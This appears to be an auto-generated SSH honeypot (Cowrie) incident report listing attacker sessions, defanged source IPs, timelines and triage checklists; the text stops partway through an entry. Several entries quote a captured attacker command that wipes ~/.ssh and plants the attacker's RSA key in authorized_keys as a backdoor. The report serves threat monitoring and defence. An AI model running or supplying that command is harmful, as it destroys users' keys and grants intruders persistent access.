| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 16:03 |
| **Last Seen** | 2026-07-02 16:03 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:03:41` | `cowrie.session.connect` |
| `2026-07-02 16:03:43` | `cowrie.client.version` |
| `2026-07-02 16:03:43` | `cowrie.client.kex` |
| `2026-07-02 16:03:49` | `cowrie.login.success` |
| `2026-07-02 16:03:53` | `cowrie.session.params` |
| `2026-07-02 16:03:53` | `cowrie.command.input` |
| `2026-07-02 16:03:54` | `cowrie.log.closed` |
| `2026-07-02 16:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-487d70448664

| Field | Detail |
|---|---|
| **Source IP** | `152.200.181[.]42` |
| **First Seen** | 2026-07-02 16:12 |
| **Last Seen** | 2026-07-02 16:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:12:25` | `cowrie.session.connect` |
| `2026-07-02 16:12:25` | `cowrie.client.version` |
| `2026-07-02 16:12:25` | `cowrie.client.kex` |
| `2026-07-02 16:12:27` | `cowrie.login.success` |
| `2026-07-02 16:12:27` | `cowrie.session.params` |
| `2026-07-02 16:12:27` | `cowrie.command.input` |
| `2026-07-02 16:12:27` | `cowrie.command.failed` |
| `2026-07-02 16:12:28` | `cowrie.log.closed` |
| `2026-07-02 16:12:29` | `cowrie.session.params` |
| `2026-07-02 16:12:29` | `cowrie.command.input` |
| `2026-07-02 16:12:29` | `cowrie.session.file_download` |
| `2026-07-02 16:12:29` | `cowrie.log.closed` |
| `2026-07-02 16:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `152.200.181[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9690c9208ebd

| Field | Detail |
|---|---|
| **Source IP** | `152.200.181[.]42` |
| **First Seen** | 2026-07-02 16:12 |
| **Last Seen** | 2026-07-02 16:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:12:29` | `cowrie.session.connect` |
| `2026-07-02 16:12:29` | `cowrie.client.version` |
| `2026-07-02 16:12:29` | `cowrie.client.kex` |
| `2026-07-02 16:12:30` | `cowrie.login.success` |
| `2026-07-02 16:12:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `152.200.181[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-562c6ddde82b

| Field | Detail |
|---|---|
| **Source IP** | `152.200.181[.]42` |
| **First Seen** | 2026-07-02 16:12 |
| **Last Seen** | 2026-07-02 16:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:12:30` | `cowrie.session.connect` |
| `2026-07-02 16:12:30` | `cowrie.client.version` |
| `2026-07-02 16:12:31` | `cowrie.client.kex` |
| `2026-07-02 16:12:32` | `cowrie.login.success` |
| `2026-07-02 16:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `152.200.181[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4eb9aa7e95c

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 16:13 |
| **Last Seen** | 2026-07-02 16:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:13:43` | `cowrie.session.connect` |
| `2026-07-02 16:13:43` | `cowrie.client.version` |
| `2026-07-02 16:13:43` | `cowrie.client.kex` |
| `2026-07-02 16:13:44` | `cowrie.login.success` |
| `2026-07-02 16:13:45` | `cowrie.session.params` |
| `2026-07-02 16:13:45` | `cowrie.command.input` |
| `2026-07-02 16:13:46` | `cowrie.log.closed` |
| `2026-07-02 16:13:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c62ab4daf562

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 16:15 |
| **Last Seen** | 2026-07-02 16:15 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:15:14` | `cowrie.session.connect` |
| `2026-07-02 16:15:16` | `cowrie.client.version` |
| `2026-07-02 16:15:16` | `cowrie.client.kex` |
| `2026-07-02 16:15:23` | `cowrie.login.success` |
| `2026-07-02 16:15:26` | `cowrie.session.params` |
| `2026-07-02 16:15:26` | `cowrie.command.input` |
| `2026-07-02 16:15:27` | `cowrie.log.closed` |
| `2026-07-02 16:15:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d8c58a2a266

| Field | Detail |
|---|---|
| **Source IP** | `121.122.119[.]214` |
| **First Seen** | 2026-07-02 16:15 |
| **Last Seen** | 2026-07-02 16:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:15:18` | `cowrie.session.connect` |
| `2026-07-02 16:15:18` | `cowrie.client.version` |
| `2026-07-02 16:15:18` | `cowrie.client.kex` |
| `2026-07-02 16:15:19` | `cowrie.login.success` |
| `2026-07-02 16:15:20` | `cowrie.session.params` |
| `2026-07-02 16:15:20` | `cowrie.command.input` |
| `2026-07-02 16:15:20` | `cowrie.command.failed` |
| `2026-07-02 16:15:21` | `cowrie.log.closed` |
| `2026-07-02 16:15:21` | `cowrie.session.params` |
| `2026-07-02 16:15:21` | `cowrie.command.input` |
| `2026-07-02 16:15:22` | `cowrie.session.file_download` |
| `2026-07-02 16:15:22` | `cowrie.log.closed` |
| `2026-07-02 16:15:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.119[.]214` to AbuseIPDB if not already reported
- [ ] Block `121.122.119[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f0f276f3e25

| Field | Detail |
|---|---|
| **Source IP** | `121.122.119[.]214` |
| **First Seen** | 2026-07-02 16:15 |
| **Last Seen** | 2026-07-02 16:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:15:22` | `cowrie.session.connect` |
| `2026-07-02 16:15:22` | `cowrie.client.version` |
| `2026-07-02 16:15:22` | `cowrie.client.kex` |
| `2026-07-02 16:15:23` | `cowrie.login.success` |
| `2026-07-02 16:15:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.119[.]214` to AbuseIPDB if not already reported
- [ ] Block `121.122.119[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bab0e856106

| Field | Detail |
|---|---|
| **Source IP** | `121.122.119[.]214` |
| **First Seen** | 2026-07-02 16:15 |
| **Last Seen** | 2026-07-02 16:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:15:24` | `cowrie.session.connect` |
| `2026-07-02 16:15:24` | `cowrie.client.version` |
| `2026-07-02 16:15:24` | `cowrie.client.kex` |
| `2026-07-02 16:15:25` | `cowrie.login.success` |
| `2026-07-02 16:15:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.119[.]214` to AbuseIPDB if not already reported
- [ ] Block `121.122.119[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a014a2e154d2

| Field | Detail |
|---|---|
| **Source IP** | `43.247.250[.]115` |
| **First Seen** | 2026-07-02 16:16 |
| **Last Seen** | 2026-07-02 16:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:16:59` | `cowrie.session.connect` |
| `2026-07-02 16:16:59` | `cowrie.client.version` |
| `2026-07-02 16:16:59` | `cowrie.client.kex` |
| `2026-07-02 16:17:00` | `cowrie.login.success` |
| `2026-07-02 16:17:01` | `cowrie.session.params` |
| `2026-07-02 16:17:01` | `cowrie.command.input` |
| `2026-07-02 16:17:01` | `cowrie.command.failed` |
| `2026-07-02 16:17:01` | `cowrie.log.closed` |
| `2026-07-02 16:17:02` | `cowrie.session.params` |
| `2026-07-02 16:17:02` | `cowrie.command.input` |
| `2026-07-02 16:17:03` | `cowrie.session.file_download` |
| `2026-07-02 16:17:03` | `cowrie.log.closed` |
| `2026-07-02 16:17:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.247.250[.]115` to AbuseIPDB if not already reported
- [ ] Block `43.247.250[.]115` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9e8c7f9fcc3

| Field | Detail |
|---|---|
| **Source IP** | `43.247.250[.]115` |
| **First Seen** | 2026-07-02 16:17 |
| **Last Seen** | 2026-07-02 16:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:17:03` | `cowrie.session.connect` |
| `2026-07-02 16:17:03` | `cowrie.client.version` |
| `2026-07-02 16:17:03` | `cowrie.client.kex` |
| `2026-07-02 16:17:04` | `cowrie.login.success` |
| `2026-07-02 16:17:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.247.250[.]115` to AbuseIPDB if not already reported
- [ ] Block `43.247.250[.]115` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-092f7e14ba02

| Field | Detail |
|---|---|
| **Source IP** | `43.247.250[.]115` |
| **First Seen** | 2026-07-02 16:17 |
| **Last Seen** | 2026-07-02 16:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:17:05` | `cowrie.session.connect` |
| `2026-07-02 16:17:05` | `cowrie.client.version` |
| `2026-07-02 16:17:05` | `cowrie.client.kex` |
| `2026-07-02 16:17:06` | `cowrie.login.success` |
| `2026-07-02 16:17:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.247.250[.]115` to AbuseIPDB if not already reported
- [ ] Block `43.247.250[.]115` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-931838915b30

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 16:26 |
| **Last Seen** | 2026-07-02 16:26 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:26:37` | `cowrie.session.connect` |
| `2026-07-02 16:26:39` | `cowrie.client.version` |
| `2026-07-02 16:26:39` | `cowrie.client.kex` |
| `2026-07-02 16:26:45` | `cowrie.login.success` |
| `2026-07-02 16:26:48` | `cowrie.session.params` |
| `2026-07-02 16:26:48` | `cowrie.command.input` |
| `2026-07-02 16:26:50` | `cowrie.log.closed` |
| `2026-07-02 16:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6495ce837116

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 16:27 |
| **Last Seen** | 2026-07-02 16:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:27:40` | `cowrie.session.connect` |
| `2026-07-02 16:27:40` | `cowrie.client.version` |
| `2026-07-02 16:27:40` | `cowrie.client.kex` |
| `2026-07-02 16:27:42` | `cowrie.login.success` |
| `2026-07-02 16:27:43` | `cowrie.session.params` |
| `2026-07-02 16:27:43` | `cowrie.command.input` |
| `2026-07-02 16:27:44` | `cowrie.log.closed` |
| `2026-07-02 16:27:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1af6592bdf45

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 16:28 |
| **Last Seen** | 2026-07-02 16:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:28:12` | `cowrie.session.connect` |
| `2026-07-02 16:28:12` | `cowrie.client.version` |
| `2026-07-02 16:28:12` | `cowrie.client.kex` |
| `2026-07-02 16:28:12` | `cowrie.login.success` |
| `2026-07-02 16:28:13` | `cowrie.session.params` |
| `2026-07-02 16:28:13` | `cowrie.command.input` |
| `2026-07-02 16:28:13` | `cowrie.log.closed` |
| `2026-07-02 16:28:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1cfe7329330

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 16:34 |
| **Last Seen** | 2026-07-02 16:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:34:48` | `cowrie.session.connect` |
| `2026-07-02 16:34:48` | `cowrie.client.version` |
| `2026-07-02 16:34:48` | `cowrie.client.kex` |
| `2026-07-02 16:34:48` | `cowrie.login.success` |
| `2026-07-02 16:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20c6a35ec4b4

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 16:34 |
| **Last Seen** | 2026-07-02 16:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:34:49` | `cowrie.session.connect` |
| `2026-07-02 16:34:49` | `cowrie.client.version` |
| `2026-07-02 16:34:49` | `cowrie.client.kex` |
| `2026-07-02 16:34:49` | `cowrie.login.success` |
| `2026-07-02 16:34:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3472db24ab28

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 16:34 |
| **Last Seen** | 2026-07-02 16:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:34:59` | `cowrie.session.connect` |
| `2026-07-02 16:34:59` | `cowrie.client.version` |
| `2026-07-02 16:34:59` | `cowrie.client.kex` |
| `2026-07-02 16:34:59` | `cowrie.login.success` |
| `2026-07-02 16:34:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1547ae9ee689

| Field | Detail |
|---|---|
| **Source IP** | `174.35.25[.]177` |
| **First Seen** | 2026-07-02 16:37 |
| **Last Seen** | 2026-07-02 16:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:37:16` | `cowrie.session.connect` |
| `2026-07-02 16:37:16` | `cowrie.client.version` |
| `2026-07-02 16:37:16` | `cowrie.client.kex` |
| `2026-07-02 16:37:16` | `cowrie.login.success` |
| `2026-07-02 16:37:16` | `cowrie.session.params` |
| `2026-07-02 16:37:16` | `cowrie.command.input` |
| `2026-07-02 16:37:16` | `cowrie.command.failed` |
| `2026-07-02 16:37:16` | `cowrie.log.closed` |
| `2026-07-02 16:37:17` | `cowrie.session.params` |
| `2026-07-02 16:37:17` | `cowrie.command.input` |
| `2026-07-02 16:37:17` | `cowrie.session.file_download` |
| `2026-07-02 16:37:17` | `cowrie.log.closed` |
| `2026-07-02 16:37:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.35.25[.]177` to AbuseIPDB if not already reported
- [ ] Block `174.35.25[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b63f414885d

| Field | Detail |
|---|---|
| **Source IP** | `174.35.25[.]177` |
| **First Seen** | 2026-07-02 16:37 |
| **Last Seen** | 2026-07-02 16:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:37:17` | `cowrie.session.connect` |
| `2026-07-02 16:37:17` | `cowrie.client.version` |
| `2026-07-02 16:37:17` | `cowrie.client.kex` |
| `2026-07-02 16:37:17` | `cowrie.login.success` |
| `2026-07-02 16:37:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.35.25[.]177` to AbuseIPDB if not already reported
- [ ] Block `174.35.25[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd443367fdd0

| Field | Detail |
|---|---|
| **Source IP** | `174.35.25[.]177` |
| **First Seen** | 2026-07-02 16:37 |
| **Last Seen** | 2026-07-02 16:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:37:17` | `cowrie.session.connect` |
| `2026-07-02 16:37:17` | `cowrie.client.version` |
| `2026-07-02 16:37:17` | `cowrie.client.kex` |
| `2026-07-02 16:37:17` | `cowrie.login.success` |
| `2026-07-02 16:37:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.35.25[.]177` to AbuseIPDB if not already reported
- [ ] Block `174.35.25[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a42ffc791e1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 16:38 |
| **Last Seen** | 2026-07-02 16:38 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:38:07` | `cowrie.session.connect` |
| `2026-07-02 16:38:09` | `cowrie.client.version` |
| `2026-07-02 16:38:09` | `cowrie.client.kex` |
| `2026-07-02 16:38:13` | `cowrie.login.success` |
| `2026-07-02 16:38:17` | `cowrie.session.params` |
| `2026-07-02 16:38:17` | `cowrie.command.input` |
| `2026-07-02 16:38:19` | `cowrie.log.closed` |
| `2026-07-02 16:38:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24c1b7295a33

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 16:41 |
| **Last Seen** | 2026-07-02 16:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:41:38` | `cowrie.session.connect` |
| `2026-07-02 16:41:39` | `cowrie.client.version` |
| `2026-07-02 16:41:39` | `cowrie.client.kex` |
| `2026-07-02 16:41:40` | `cowrie.login.success` |
| `2026-07-02 16:41:42` | `cowrie.session.params` |
| `2026-07-02 16:41:42` | `cowrie.command.input` |
| `2026-07-02 16:41:42` | `cowrie.log.closed` |
| `2026-07-02 16:41:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e105659599c

| Field | Detail |
|---|---|
| **Source IP** | `139.59.208[.]49` |
| **First Seen** | 2026-07-02 16:44 |
| **Last Seen** | 2026-07-02 16:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
